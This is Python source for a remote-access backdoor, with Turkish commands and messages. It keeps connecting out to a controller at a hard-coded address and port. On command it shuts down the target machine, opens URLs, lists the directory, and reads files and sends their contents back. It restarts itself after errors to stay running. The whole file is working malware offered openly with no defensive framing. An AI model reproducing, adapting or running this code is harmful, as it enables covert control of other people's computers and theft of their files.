import socket
import os
import time
import webbrowser
from colorama import Back, Fore, Style, init
import sys

init()

def main():
    while True:
        try:
            baglantı = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            baglantı.connect(("192.168.82.48", 2505))
            break
        except Exception as e:
            print(e)
            time.sleep(10)

    while True:
        try:
            emir = baglantı.recv(1024).decode("utf-8")

            if emir == "kapat":
                response = "target kapatılıyor"
                os.system("sudo shutdown now")
                
                
            elif emir == "url":
                response = "lütfen açmak istediğiniz sayfanın urlsini yapıştırın"
                
                
            elif emir.startswith("http"):
                webbrowser.open(emir)
                response = "web sitesi açılıyor"
                
                
                
            elif emir == "sesfull":
                print("sesi fullemek için gerekli kodlar")
                response = "ses fulleniyor"
                
                
            elif emir == "ls":
                try:
                    dosyalar = os.listdir(".")
                    response = "\n".join(dosyalar)
                except Exception as e:
                    response = f"Error listing directory: {e}"
                    
                    
                    
            elif emir.startswith("cat"):
                dosya_adi = emir.split(" ")[1] if len(emir.split(" ")) > 1 else ""
                try:
                    with open(dosya_adi, 'r') as f:
                        icerik = f.read()
                    response = f"Dosya içeriği:\n{icerik}"
                except Exception as e:
                    response = f"Error reading file: {e}"
                    
                    
                    
            elif emir == "seskapat":
                print("sesi kapatmak için gerekli kodlar")
                response = "ses kapatılıyor"
                
                
            elif emir == "yardım":
                response = (
                    Fore.BLUE + "KAPAT:karşı sistemi kapatır\n" + Fore.RESET +
                    Fore.GREEN + "URL:karşı sistemde web sitesi açar\n" + Fore.RESET +
                    Fore.YELLOW + "SESFULL-SESKAPAT:karşı sistemin sesini fuller ya da tamamen kapatır\n" + Fore.RESET +
                    "CAT-LS:karşı sistemdeki dosyayı okur, karşı sistemin dizinindeki dosyaları gösterir"
                )
                
                
            elif emir == "":
                print("")
                
                
            else:
                print("geçersiz emir")
                response = "GEÇERSİZ EMİR"
                
            baglantı.send(response.encode("utf-8"))

        except Exception as e:
            print(f"Bir hata oluştu: {e}")
            time.sleep(2)  # İsteğe bağlı bekleme süresi
            # Programı yeniden başlat
            os.execv(sys.executable, ['python'] + sys.argv)

if __name__ == "__main__":
    while True:
        main()
